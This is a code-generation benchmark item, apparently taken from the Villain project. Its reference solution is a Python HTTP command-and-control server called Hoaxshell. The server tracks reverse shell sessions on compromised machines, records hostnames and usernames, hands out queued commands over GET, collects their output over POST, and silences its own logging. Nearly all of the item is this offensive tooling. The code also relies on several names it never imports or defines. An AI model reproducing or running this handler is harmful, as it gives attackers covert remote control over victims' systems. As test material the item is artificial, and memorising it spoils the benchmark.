{
  "Task_id": 225,
  "Github_ID": "557545904",
  "Github_Project_Name": "Villain",
  "Programming_Language": "Python",
  "suffix": ".py",
  "Interface_class": "IPC",
  "Interface_name": "HTTP Server - side by using http.server in python",
  "Instruction": "Task Description: Create a custom HTTP server class that handles GET, POST, and OPTIONS requests for managing shell sessions, including session verification, command execution, and response handling.\n\nClass Description: Hoaxshell is a custom HTTP request handler that extends BaseHTTPRequestHandler to manage reverse shell sessions. It handles session establishment, command execution, and response collection while maintaining session state.\n\nAttributes:\n- server_name: [str] - Name identifier for the server\n- header_id: [str] - Custom header identifier for session tracking\n- server_unique_id: [str] - Unique identifier for the server instance\n- command_pool: [dict] - Pool of commands to be executed per session\n\nMethods:\n- do_GET([self]) -> None - Handles GET requests for session verification and command retrieval\n- do_POST([self]) -> None - Handles POST requests for command output submission\n- do_OPTIONS([self]) -> None - Handles OPTIONS requests for CORS preflight\n- log_message([self, format, *args]) -> None - Overrides default logging to suppress messages\n- initiate_hoax_server() -> None - Static method to start the HTTP server with optional SSL support\n\nThe class interacts with session management components and implements custom request handling for shell session management, including session verification, command distribution, and response collection. It supports both HTTP and HTTPS modes with configurable ports and SSL certificates.",
  "Canonical_solution": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport ssl\n\nclass Hoaxshell(BaseHTTPRequestHandler):\n    server_name = 'Hoaxshell Multi-Handler'\n    header_id = None\n    server_unique_id = None\n    command_pool = {}\n\n    def do_GET(self):\n        timestamp = int(datetime.now().timestamp())\n        \n        if not self.header_id:\n            header_id_extract = [header.replace(\"X-\", \"\") for header in self.headers.keys() if re.match(\"X-[a-z0-9]{4}-[a-z0-9]{4}\", header)]\n            self.header_id = f'X-{header_id_extract[0]}'\n\n        try:\n            session_id = self.headers.get(self.header_id)\n        except:\n            session_id = None\n\n        if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):\n            if session_id in Sessions_Manager.legit_session_ids.keys():\n                h = session_id.split('-')\n                Sessions_Manager.verify.append(h[0])\n                Sessions_Manager.get_cmd.append(h[1])\n                Sessions_Manager.post_res.append(h[2])\n\n                Sessions_Manager.active_sessions[session_id] = {\n                    'IP Address': self.client_address[0],\n                    'Port': self.client_address[1],\n                    'execution_verified': False,\n                    'Status': 'Active',\n                    'last_received': timestamp,\n                    'OS Type': Sessions_Manager.legit_session_ids[session_id]['OS Type'],\n                    'frequency': Sessions_Manager.legit_session_ids[session_id]['frequency'],\n                    'Owner': self.server_unique_id,\n                    'self_owned': True,\n                    'aliased': False,\n                    'alias': None,\n                    'Listener': 'hoaxshell',\n                    'Shell': Sessions_Manager.legit_session_ids[session_id]['Shell'],\n                    'iface': Sessions_Manager.legit_session_ids[session_id]['iface'],\n                    'prompt': None,\n                    'Stability': 'Unstable'\n                }\n                self.command_pool[session_id] = []\n\n        elif session_id and (session_id in Sessions_Manager.active_sessions.keys()):\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        session_id = self.headers.get(self.header_id)\n        legit = True if session_id in Sessions_Manager.legit_session_ids.keys() else False\n\n        url_split = self.path.strip(\"/\").split(\"/\")\n\n        if (url_split[0] in Sessions_Manager.verify and legit) or \\\n           (legit and session_id in Sessions_Manager.active_sessions and not Sessions_Manager.active_sessions[session_id]['execution_verified']):\n            \n            if Sessions_Manager.active_sessions[session_id]['execution_verified']:\n                print_to_prompt(f'\\r[{INFO}] Received \"Verify execution\" request from an already established session (ignored).')\n                return\n\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n            self.wfile.write(bytes('OK', \"utf-8\"))\n            Sessions_Manager.active_sessions[session_id]['execution_verified'] = True\n\n            try:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]\n                Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')\n\n            except IndexError:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'\n                Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')\n\n            try:\n                Thread(target=self.monitor_shell_state, args=(session_id,), name=f'session_state_monitor_{self.client_address[0]}', daemon=True).start()\n            except:\n                pass\n\n            new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])\n            new_session_data['session_id'] = session_id\n            new_session_data['alias'] = None\n            new_session_data['aliased'] = False\n            new_session_data['self_owned'] = False\n            Core_Server.announce_new_session(new_session_data)\n            del new_session_data\n\n        elif self.path.strip(\"/\") in Sessions_Manager.get_cmd and legit:\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n\n            if len(self.command_pool[session_id]):\n                cmd = self.command_pool[session_id].pop(0)\n                if isinstance(cmd, dict):\n                    cmd = cmd['data']\n                self.wfile.write(bytes(cmd, 'utf-8'))\n            else:\n                self.wfile.write(bytes('None', 'utf-8'))\n\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n            return\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'')\n\n    def do_POST(self):\n        timestamp = int(datetime.now().timestamp())\n        session_id = self.headers.get(self.header_id)\n        legit = True if (session_id in Sessions_Manager.legit_session_ids.keys()) else False\n\n        if legit:\n            try:\n                Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n                self.server_version = Hoaxshell_Settings.server_version\n                self.sys_version = \"\"\n\n                if self.path.strip(\"/\") in Sessions_Manager.post_res and legit and \\\n                   session_id in Sessions_Manager.active_sessions.keys():\n                    \n                    try:\n                        self.send_response(200)\n                        self.send_header('Content-Type', 'text/plain')\n                        self.end_headers()\n                        self.wfile.write(b'OK')\n                        content_len = int(self.headers.get('Content-Length'))\n                        output = None\n                        output = self.rfile.read(content_len)\n                        output = self.cmd_output_interpreter(session_id, output, constraint_mode=Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])\n                        \n                        if not isinstance(output, int):\n                            if isinstance(output, str):\n                                if re.search(\"The term 'OK' is not recognized as the name of a cmdlet, function, script file\", output) or re.search('bash: line 1: OK: command not found', output):\n                                    return\n                                print(f'\\r{GREEN}{output}{END}') if output else do_nothing()\n                                print()\n                                Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                            elif isinstance(output, list):\n                                if not isinstance(output[1], int):\n                                    try:\n                                        Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', '', session_id, True], 'command_output', 30)\n                                    except:\n                                        pass\n\n                    except ConnectionResetError:\n                        error_msg = f'[{ERR}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get(\"Content-Length\")}). Try limiting the command\\'s output.'\n                        if isinstance(output, str):\n                            print(error_msg)\n                            Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                        elif isinstance(output, list):\n                            try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, '', session_id, True], 'command_output', 30)\n                            except: pass\n                        del error_msg\n\n                    finally:\n                        del output\n\n            except KeyError:\n                pass\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Move on mate.')\n\n    def do_OPTIONS(self):\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', self.headers[\"Origin\"])\n        self.send_header('Vary', \"Origin\")\n        self.send_header('Access-Control-Allow-Credentials', 'true')\n        self.send_header('Access-Control-Allow-Headers', Hoaxshell_Settings.header_id)\n        self.end_headers()\n        self.wfile.write(b'OK')\n\n    def log_message(self, format, *args):\n        return\n\ndef initiate_hoax_server():\n    try:\n        if (Hoaxshell_Settings.certfile and not Hoaxshell_Settings.keyfile) or \\\n           (Hoaxshell_Settings.keyfile and not Hoaxshell_Settings.certfile):\n            exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')\n\n        port = Hoaxshell_Settings.bind_port if not Hoaxshell_Settings.ssl_support else Hoaxshell_Settings.bind_port_ssl\n\n        try:\n            httpd = HTTPServer((Hoaxshell_Settings.bind_address, port), Hoaxshell)\n        except OSError:\n            exit(f'[{DEBUG}] {Hoaxshell.server_name} failed to start. Port {port} seems to already be in use.\\n')\n        except:\n            exit(f'\\n[{DEBUG}] {Hoaxshell.server_name} failed to start (Unknown error occurred).\\n')\n\n        if Hoaxshell_Settings.ssl_support:\n            context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n            context.load_cert_chain(certfile=Hoaxshell_Settings.certfile, keyfile=Hoaxshell_Settings.keyfile)\n            httpd.socket = context.wrap_socket(sock=httpd.socket, server_side=True)\n\n        Hoaxshell_server = Thread(target=httpd.serve_forever, args=(), name='hoaxshell_server')\n        Hoaxshell_server.daemon = True\n        Hoaxshell_server.start()\n        registered_services.append({\n            'service': Hoaxshell.server_name,\n            'socket': f'{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}'\n        })\n        print(f'[{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}]::{Hoaxshell.server_name}')\n\n    except KeyboardInterrupt:\n        Hoaxshell.terminate()\n```",
  "FSMID_for_test": 55,
  "Code_level": "Class-level"
}